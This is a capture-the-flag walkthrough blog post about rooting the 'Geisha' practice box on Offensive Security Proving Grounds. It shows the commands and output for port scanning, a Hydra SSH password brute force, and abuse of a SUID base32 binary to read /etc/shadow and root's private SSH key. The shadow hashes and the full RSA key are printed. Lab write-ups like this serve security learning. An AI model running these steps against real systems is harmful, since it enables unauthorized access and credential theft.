---
layout: post
title:  "Giesha Walkthrough"
date:   2021-10-06 12:44:14 -0400
categories: boxwriteup
---

# Giesha Walkthrough

Giesha is a free box on Offensive Security Proving Grounds "Play" edition. It is marked as 'easy' and let's have a try.


***
## Nmap Scan & Enumeration

### Nmap Scan

```bash
# Nmap 7.91 scan initiated Thu Oct  7 16:19:02 2021 as: nmap -vvv -sC -sV -p- -o full.nmap 192.168.57.82
Nmap scan report for 192.168.57.82
Host is up, received reset ttl 63 (0.028s latency).
Scanned at 2021-10-07 16:19:02 EDT for 53s
Not shown: 65528 closed ports
Reason: 65528 resets
PORT     STATE SERVICE       REASON         VERSION
21/tcp   open  ftp           syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsnjUYSc5T2b2tvCMjMFB05R1XDb0k679PiBuAr7+F+zGCwqqj/QwNZorBNG6uGYxUx+hN/djf3VVjjFwI3yZpwhSDTuJdBWUOQtHGcAvRu7hX6I29y2WbK7ITYJFqAe/1dgvwE91JvN3lnEHJnjYOH0SCFLAwJeC3WiKNJu2pmk20vYKSLajudjWgD4mgppJQOt/TNWSaQpzMlgHYygXyWjSv2/vYxhBl7vRSI2P6joSvE9WS98Ix79LpZlnFvPYnm/Wkpm+tdxD+H33SsAS1um8QVU10sCdjm9GW4Lbn2oCIdasxEN+ezRoTuFwSDepA45lSJaa3p7EBh8TPyGCB
|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF+MSjR5FloxtxKTmLLe+8QjrOPcWBTPXu+DAirwB1DqN4lU6RvK6H4AoNOiToigicCVCgXodXPkTG1QVfM3+3w=
|   256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDUrhhKnEjUk+AwDfJvlMJuI6eF7e93Fb9yW9fE8ElYt
80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Geisha
7080/tcp open  ssl/empowerid syn-ack ttl 63 LiteSpeed
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: LiteSpeed
|_http-title: Did not follow redirect to https://192.168.57.82:7080/
| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US/X509v3 Subject Alternative Name=DNS.1=42.114.248.217
| Issuer: commonName=geisha/organizationName=webadmin/countryName=US/X509v3 Subject Alternative Name=DNS.1=42.114.248.217
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-09T14:01:34
| Not valid after:  2022-05-09T14:01:34
| MD5:   6df2 adf3 8254 f954 1f65 b502 0e94 5985
| SHA-1: bd05 448c fa9f 3d8a a040 3396 8676 c64d 0f96 9993
| -----BEGIN CERTIFICATE-----
| MIIDgTCCAmmgAwIBAgIUFeiaytpVPnCwr3NeflpRgFWSr/owDQYJKoZIhvcNAQEL
| BQAwUDEPMA0GA1UEAwwGZ2Vpc2hhMREwDwYDVQQKDAh3ZWJhZG1pbjELMAkGA1UE
| BhMCVVMxHTAbBgNVHREMFEROUy4xPTQyLjExNC4yNDguMjE3MB4XDTIwMDUwOTE0
| MDEzNFoXDTIyMDUwOTE0MDEzNFowUDEPMA0GA1UEAwwGZ2Vpc2hhMREwDwYDVQQK
| DAh3ZWJhZG1pbjELMAkGA1UEBhMCVVMxHTAbBgNVHREMFEROUy4xPTQyLjExNC4y
| NDguMjE3MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuEP+LbXsfPqr
| pVEB+ZccPUiA6azaQduNP/A2004Z4i0kvZRKCL2C6fMYSKXeG0IBmG51ZCXrV6Hj
| 78IxK8AYRtyRgjIXi0eaaY0i4aF+7A7HQzyRuIO6lwlR+h6JdT8Hxu6CHPdG/xMU
| 2iMQDe+DuuGtW4pNh0cpUo/bRcZ9Tik1780YRwGX7DwpfgyiVoZ/+rUymtZyIgO1
| opepZDe0CxX1dk7QEhmBHSlAAMKZIbAeDWNIk2ZzKSkLHG+JpRAs83oVSJUq1+zc
| UhlgknREQ8De4+XTgFKEaoDufNaA9/4RIjjIbeMTSlNcbr22QKgkjNGLhr72SsZk
| zDnoadQ8kwIDAQABo1MwUTAdBgNVHQ4EFgQU62pKCQW8p/EdAXxaGM/XR7IBa4cw
| HwYDVR0jBBgwFoAU62pKCQW8p/EdAXxaGM/XR7IBa4cwDwYDVR0TAQH/BAUwAwEB
| /zANBgkqhkiG9w0BAQsFAAOCAQEAT2+CdEmmnfv4H42SvNrE5uK7Y59RR3lnxOnF
| qf3Ll/wDYtpgP8YV6ejLWUxTNXKjgDJVDuHx+NYUcEJ7rIgwIeG/owPx2XGavDeN
| 1ptLFscII8i5nf99aN7KJRzUV8bRB4aeJ5FBB7OWuErE3iY4o5IUSprUYZ3rYrZW
| Zq4GgSHmCkUWXgvZ6t5HNOZTsOKxZyHki0r0JtYfALg/aqZ58Z093Emh+GSPp/Jx
| jnek3xaUtxjG/wsVQNr3UY9HvsSQqIKm7ZDzNRho5KZu+Za7n4ts9izBtXy4r85Q
| gQpr2TCYBN8AoV/4SMakb4xA8W6XTG+CXGt2QmJkdhOLdZpkBQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-10-07T20:19:55+00:00; +1s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
7125/tcp open  http          syn-ack ttl 62 nginx 1.17.10
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.17.10
|_http-title: Geisha
8088/tcp open  http          syn-ack ttl 63 LiteSpeed httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: LiteSpeed
|_http-title: Geisha
9198/tcp open  http          syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 2.7.16)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
|_http-title: Geisha
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  7 16:19:55 2021 -- 1 IP address (1 host up) scanned in 52.82 seconds
~
```
### Port 80, 7125, 8088, 9198 (HTTP)

All of these ports seemed to be a simple HTTP home page with a picture.
![9f5bc68f3989a40db95c7cbb8ecd319a.png](/assets/images/giesha/Capture.PNG)

Upon Examining the source code for each one, it had a single title and the same png
```html
<body on contextmenu="return false;">

<html>

<head>

<title>Geisha</title>

</head>

<body bgcolor="#FFFFFF">

<center>

<img src="image.png" class="center" align="center" >
```

I threw some directory busting in the background on all 4 ports. On port 7125, it seemed there was an exposed linux passwd file. Let's curl this down and see what we get...
```bash
┌──(raindayzz㉿redfish)-[~/OffSecPG/Geisha]
└─$ cat gobuster7125.txt                                                                                                                                                         1 ⚙
/index.php            (Status: 200) [Size: 175]
/passwd               (Status: 200) [Size: 1432]
/index.php            (Status: 200) [Size: 175]
```
Curl Command
```bash
┌──(raindayzz㉿redfish)-[~/OffSecPG/Geisha]
└─$ curl 192.168.57.82:7125/passwd                                                                                                                                               1 ⚙
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin
```

As we can see there is a geisha user, let's spray this username everywhere (SSH,FTP) and see if we can get an easy win. 


```bash
┌──(raindayzz㉿redfish)-[~/OffSecPG/Geisha]
└─$ hydra -l geisha -P /usr/share/wordlists/rockyou.txt ssh://192.168.57.82                                                                                                      1 ⚙
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-07 17:22:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.57.82:22/
[STATUS] 163.00 tries/min, 163 tries in 00:01h, 14344240 to do in 1466:42h, 16 active
[STATUS] 113.33 tries/min, 340 tries in 00:03h, 14344063 to do in 2109:26h, 16 active
[22][ssh] host: 192.168.57.82   login: geisha   password: letmein
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-07 17:27:42
```
### User SSH access / Shell

BOOM! The password is 'letmein', Hydra only had to guess around 500 passwords. Let's SSH into the box.

```bash
┌──(raindayzz㉿redfish)-[~/OffSecPG/Geisha]
└─$ ssh geisha@192.168.57.82
geisha@192.168.57.82's password: 
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  7 17:04:26 2021 from 192.168.49.57
geisha@geisha:~$ whoami
geisha
```

I transfered over linpeas.sh and gave it a run.. Examining the SUIDs it collected, it looks like we have a winner.

```bash
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root        35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root        63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root        51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-sr-x 1 root root        43K Feb 28  2019 /usr/bin/base32
-rwsr-xr-- 1 root messagebus  50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root       154K Feb  2  2020 /usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root root        35K Apr 22  2020 /usr/bin/fusermount
```

Base32 has the SUID bit set, we can take advantage of this to read any file we choose!

### Obtaining Root

We can run base32 with sudoish permissions. Let's read the shadow file (Linux password file that contians the hashes)

```bash
geisha@geisha:~$ base32 /etc/shadow
OJXW65B2EQ3CIM3IMFDHO4TEJBFFEWSLK5CC4LZEJRMWSVCBOBDUG3DHO5WUMRJTKRME2UTUMVVV
O4CHJ5MTMZSTOBXFI33SONIUYL2GIJZDSWLEJ5LTITSIJV5FSRTLJ5GHKODRJJIVMYJRO5YWMRKD
GNQS4U22MVKEQSLZIVUGYUCGGA5DCOBUGQ3DUMB2HE4TSOJZHI3TUOR2BJSGCZLNN5XDUKR2GE4D
GOBVHIYDUOJZHE4TSORXHI5DUCTCNFXDUKR2GE4DGOBVHIYDUOJZHE4TSORXHI5DUCTTPFZTUKR2
GE4DGOBVHIYDUOJZHE4TSORXHI5DUCTTPFXGGORKHIYTQMZYGU5DAORZHE4TSOJ2G45DUOQKM5QW
2ZLTHIVDUMJYGM4DKORQHI4TSOJZHE5DOOR2HIFG2YLOHIVDUMJYGM4DKORQHI4TSOJZHE5DOOR2
HIFGY4B2FI5DCOBTHA2TUMB2HE4TSOJZHI3TUOR2BJWWC2LMHIVDUMJYGM4DKORQHI4TSOJZHE5D
OOR2HIFG4ZLXOM5CUORRHAZTQNJ2GA5DSOJZHE4TUNZ2HI5AU5LVMNYDUKR2GE4DGOBVHIYDUOJZ
HE4TSORXHI5DUCTQOJXXQ6J2FI5DCOBTHA2TUMB2HE4TSOJZHI3TUOR2BJ3XO5ZNMRQXIYJ2FI5D
COBTHA2TUMB2HE4TSOJZHI3TUOR2BJRGCY3LOVYDUKR2GE4DGOBVHIYDUOJZHE4TSORXHI5DUCTM
NFZXIORKHIYTQMZYGU5DAORZHE4TSOJ2G45DUOQKNFZGGORKHIYTQMZYGU5DAORZHE4TSOJ2G45D
UOQKM5XGC5DTHIVDUMJYGM4DKORQHI4TSOJZHE5DOOR2HIFG433CN5SHSORKHIYTQMZYGU5DAORZ
HE4TSOJ2G45DUOQKL5QXA5B2FI5DCOBTHA2TUMB2HE4TSOJZHI3TUOR2BJZXS43UMVWWILLUNFWW
K43ZNZRTUKR2GE4DGOBVHIYDUOJZHE4TSORXHI5DUCTTPFZXIZLNMQWW4ZLUO5XXE2Z2FI5DCOBT
HA2TUMB2HE4TSOJZHI3TUOR2BJZXS43UMVWWILLSMVZW63DWMU5CUORRHAZTQNJ2GA5DSOJZHE4T
UNZ2HI5AU3LFONZWCZ3FMJ2XGORKHIYTQMZYGU5DAORZHE4TSOJ2G45DUOQKONZWQZB2FI5DCOBT
HA2TUMB2HE4TSOJZHI3TUOR2BJTWK2LTNBQTUJBWERMXIRCGMJRGQSCIMY2UCZZVMVVCIM2FNJGE
MS2XGFQVGTSCNRTEC2DDPFVG2WJZG5SUY4SOORRHURCXKE4XUNKZOZJXM5KBGY2WWSBXLJTUQURR
MY4VMR2GNBAUKR2HOFUUWQLUIY4C6L2VGQ2U2OCRJ5EG65KROJLWELR2GE4DIOJUHIYDUOJZHE4T
SORXHI5DUCTTPFZXIZLNMQWWG33SMVSHK3LQHIQSCORRHAZTQNJ2HI5DUOR2BJTHI4B2FI5DCOBT
HEYTUMB2HE4TSOJZHI3TUOR2BI======
```

So if we can encrypt them all we have to do is decrypt the material and BOOM!

```bash
geisha@geisha:~$ base32 /etc/shadow | base32 -d
root:$6$3haFwrdHJRZKWD./$LYiTApGClgwmFE3TXMRtekWpGOY6fSpnTorsQL/FBr9YdOW4NHMzYFkOLu8qJQVa1wqfEC3a.SZeTHIyEhlPF0:18446:0:99999:7:::
daemon:*:18385:0:99999:7:::
bin:*:18385:0:99999:7:::
sys:*:18385:0:99999:7:::
sync:*:18385:0:99999:7:::
games:*:18385:0:99999:7:::
man:*:18385:0:99999:7:::
lp:*:18385:0:99999:7:::
mail:*:18385:0:99999:7:::
news:*:18385:0:99999:7:::
uucp:*:18385:0:99999:7:::
proxy:*:18385:0:99999:7:::
www-data:*:18385:0:99999:7:::
backup:*:18385:0:99999:7:::
list:*:18385:0:99999:7:::
irc:*:18385:0:99999:7:::
gnats:*:18385:0:99999:7:::
nobody:*:18385:0:99999:7:::
_apt:*:18385:0:99999:7:::
systemd-timesync:*:18385:0:99999:7:::
systemd-network:*:18385:0:99999:7:::
systemd-resolve:*:18385:0:99999:7:::
messagebus:*:18385:0:99999:7:::
sshd:*:18385:0:99999:7:::
geisha:$6$YtDFbbhHHf5Ag5ej$3EjLFKW1aSNBlfAhcyjmY97eLrNtbzDWQ9z5YvSvuA65kH7ZgHR1f9VGFhAEGGqiKAtF8//U45M8QOHouQrWb.:18494:0:99999:7:::
systemd-coredump:!!:18385::::::
ftp:*:18391:0:99999:7:::
```

And the is the dump of the password hashes... Unless we can crack the root's hash, for now this is worthless. Let's attack some SSH keys :)

We know that SSH keys are in the format of 

/UsersHomeDir/.ssh/(id_rsa OR id_rsa.pub OR authorized_keys)

Let's do the same technique we used to grab the root's private SSH key
```bash
geisha@geisha:~$ base32 /root/.ssh/id_rsa | base32 -d
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
-----END RSA PRIVATE KEY-----
```

Copy this to our local machine and set the permissions to be useable. 

```bash
┌──(raindayzz㉿redfish)-[~/OffSecPG/Geisha]
└─$ vim rootsshkey.txt                                                                                                                                                           1 ⚙
                                                                                                                                                                                     
┌──(raindayzz㉿redfish)-[~/OffSecPG/Geisha]
└─$ chmod 0600 rootsshkey.txt
```

Now that it is copied over and ready to go, let's try to SSH as root!
```bash
┌──(raindayzz㉿redfish)-[~/OffSecPG/Geisha]
└─$ ssh -i rootsshkey.txt root@192.168.57.82                                                                                                                               130 ⨯ 1 ⚙
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  7 17:14:28 2021 from 192.168.49.57
root@geisha:~# whoami
root
root@geisha:~# 
```

BOOM! Relatively easy box, but if you don't guess the password, it could be a long day.... 
